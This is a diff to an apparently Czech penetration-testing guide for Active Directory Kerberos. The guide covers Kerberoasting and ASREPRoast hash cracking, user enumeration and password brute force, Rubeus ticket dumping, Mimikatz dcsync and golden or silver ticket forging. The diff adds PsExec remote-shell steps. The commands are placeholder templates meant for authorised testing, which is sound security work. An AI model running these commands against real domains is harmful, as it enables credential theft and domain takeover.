@@ -4,7 +4,7 @@
 
 ### Popis testu
 
-Cílem testu je ověřit, zda je možné získat a prolomit NTML hash TGS.
+Cílem testu je ověřit, zda je možné získat a prolomit NTML hash tiketů TGS. Tiket je zašifrován tajným klíčem uživatele odvozeného z jeho hesla. Získáním tiketů lze hesla lámat offline slovníkovým útokem nebo útokem hrubou silou.
 
 ### Jak provést test manuálně
 
@@ -43,8 +43,6 @@ hashcat64.exe -a -m 13100 SPN.hash <cesta ke slovniku>
 
 **Enumerace (Kali Linux)**
 
-Nutná znalost přihlašovacích údajů pro připojení do domény.
-
 Enumerace:
 ```
 git clone https://github.com/SecureAuthCorp/impacket.git
@@ -65,18 +63,18 @@ Prolomení hashe uživatelského hesla a získání přihlašovacích údajů do
 
 ### Testem lze odhalit tyto zranitelnosti
 
-- Ticket encryption with password hash
+- [Ticket encryption with password hash](vulnerabilities.md)
 
 ## Enumerace uživatelských účtů a útok hrubou silou
 
 ### Popis testu
 
-Cílem testu je ověřit, zda je možné enumerovat uživatelské účty
+Cílem testu je ověřit, zda je možné enumerovat uživatelské účty a získat tak přístupové údaje do domény Active Directory. Test lze provést bez uživatelského účtu, stačí se pouze spojit s KDC.
 
 
 **Enumerace (Kali Linux)**
 
-Nástrojem [nmap](https://nmap.org/) a skriptu [krb5-enum-users](https://nmap.org/nsedoc/scripts/krb5-enum-users.html):
+Nástrojem [nmap](https://nmap.org/) a skriptem [krb5-enum-users](https://nmap.org/nsedoc/scripts/krb5-enum-users.html):
 ```
 nmap -verbose 4 -p 88 --script krb5-enum-users --script-args krb5-enum-users-realm='kerbrealm',userdb=<soubor s uzivateli> <ip adresa domenoveho radice>
 ```
@@ -91,7 +89,7 @@ cd kerbrute
 
 pip install -r requirements.txt
 
-python kerbrute.py -domain <adresa domeny> -users <soubor s uzivateli> -passwords <soubor s hesly> -outputfile <nalezeni uzivatele>
+python kerbrute.py -domain <adresa domeny> -users <soubor s uzivateli> -passwords <soubor s hesly> -outputfile <nalezene ucty>
 ```
 
 ### Možné výsledky testu
@@ -100,7 +98,7 @@ Nalezení uživatele a hesla doménového účtu.
 
 ### Testem lze odhalit tyto zranitelnosti
 
-- Enumerace uživatelských účtů
+- [Enumerace uživatelských účtů](vulnerabilities.md)
 
 ## Unconstrained delegation (TGT Forwarding / Trusted Forwarding)
 
@@ -124,7 +122,13 @@ Pomocí administrátorského účtu/účtu služby shromáždit TGT tickety:
 Rubeus.exe dump
 ```
 
+### Možné výsledky testu
+
 Tikety lze použít pro útok Pass-the-Ticket.
+
+### Testem lze odhalit tyto zranitelnosti
+
+- [Unconstrained delegation (TGT Forwarding / Trusted Forwarding)](vulnerabilities.md)
 
 ## Constrained Delegation 
 
@@ -151,8 +155,9 @@ Získat TGS tiket nástrojem [Rubeus](https://github.com/GhostPack/Rubeus):
 ```
 Rubeus.exe asktgt /user:<uzivatel> /domain:<domena> /rc4:<NTML hash hesla>
 ```
+### Testem lze odhalit tyto zranitelnosti
 
-
+- [Constrained Delegation)](vulnerabilities.md)
 
 ## ASREPRoast
 
@@ -210,7 +215,7 @@ hashcat64.exe -a 0 -m 7500 asrep.hash <cesta ke slovniku>
 
 ### Popis testu
 
-Útok Pass-the-Ticket je založen na odcizení validního TGT tiketu uživatele a jeho přeposlání útočníkem. Útočník tak nemusí znát uživatelské heslo ani jeho hash a pomocí specializovaných nástrojů, jako je např. Mimikatz nebo Rubeus, lze získat tiket z paměti LSASS kompromitovaného systému. Proces žádosti o TGT tiket se přeskočí, jelikož útočník tiket již má k dispozici a zažádá tak přímo TGS o tiket služby ST. Jelikož je tiket validní, tak KDC není schopen probíhající útok zastavit. Se získaným tiketem služby může útočník dále bez problému k dané službě přistupovat. Útok lze provést nástrojem Rubeus.
+Útok Pass-the-Ticket je založen na odcizení validního TGT tiketu uživatele a jeho přeposlání útočníkem. Útočník tak nemusí znát uživatelské heslo ani jeho hash a pomocí specializovaných nástrojů, jako je např. Mimikatz nebo Rubeus, lze získat tiket z paměti LSASS kompromitovaného systému. Proces žádosti o TGT tiket se přeskočí, jelikož útočník tiket již má k dispozici a zažádá tak přímo TGS o tiket služby ST. Jelikož je tiket validní, tak KDC není schopen probíhající útok zastavit. Se získaným tiketem služby může útočník dále bez problému k dané službě přistupovat. Tikety lze získat z LSASS (Local Security Authority Subsystem Service). Útok lze provést nástrojem Rubeus.
 
 ### Jak provést test manuálně
 
@@ -223,6 +228,11 @@ Rubeus.exe dump
 Aktivace tiketu:
 ```
 Rubeus.exe <tiket>.kirbi
+```
+
+Vzdálený přístup pomocí [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):
+```
+PsExec.exe -accepteula \\<domena> cmd
 ```
 
 ### Možné výsledky testu
@@ -263,6 +273,11 @@ lsadump::dcsync /domain:<adresa domeny> /user:<uzivatelske jmeno>
 Vygenerovat TGT tiket nástrojem Mimikatz:
 ```
 kerberos::golden /domain: <adresa domeny> /sid:<SID> /user:<uzivatelske jmeno> /id:<RID> /krbtgt:<NTLM hash KRBTGT> /ptt
+```
+
+Vzdálený přístup pomocí [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):
+```
+PsExec.exe -accepteula \\<domena> cmd
 ```
 
 ### Možné výsledky testu
@@ -311,6 +326,11 @@ samdump2 system sam
 Vygenerovat tiket pomocí nástrojem [Mimikatz](https://github.com/ParrotSec/mimikatz):
 ```
 kerberos::golden /domain: <adresa domeny> /sid:<SID> /user:<uzivatelske jmeno> /id:<RID> /rc4:<NTLM hash hesla> /ptt
+```
+
+Vzdálený přístup pomocí [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):
+```
+PsExec.exe -accepteula \\<domena> cmd
 ```
 
 ### Možné výsledky testu
